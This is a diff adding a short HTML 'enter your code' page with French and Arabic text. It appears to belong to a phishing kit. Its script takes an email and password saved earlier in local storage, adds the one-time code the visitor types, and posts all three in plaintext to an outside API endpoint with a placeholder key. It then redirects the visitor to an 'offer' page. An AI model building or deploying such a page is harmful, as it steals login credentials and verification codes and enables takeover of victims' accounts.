@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Entrer le code</title>
+</head>
+<body>
+  <h2>إدخال الكود</h2>
+  <form id="codeForm">
+    <input type="text" id="userCode" placeholder="Entrez votre code" required><br><br>
+    <button type="submit">Confirmer</button>
+  </form>
+
+  <script>
+    document.getElementById('codeForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const email = localStorage.getItem('temp_email');
+      const password = localStorage.getItem('temp_password');
+      const code = document.getElementById('userCode').value;
+
+      // إرسال البيانات إلى Baseey
+      try {
+        await fetch('https://api.baseey.com/v1/userlist', { // ضع رابط Baseey الخاص بك
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': 'Bearer YOUR_BASEEY_API_KEY' // ضع المفتاح الخاص بك
+          },
+          body: JSON.stringify({ email: email, password: password, code: code })
+        });
+      } catch (err) {
+        console.log("Error saving data:", err);
+      }
+
+      // التوجيه لصفحة العرض الأولى
+      window.location.href = 'offer1.html';
+    });
+  </script>
+</body>
+</html>
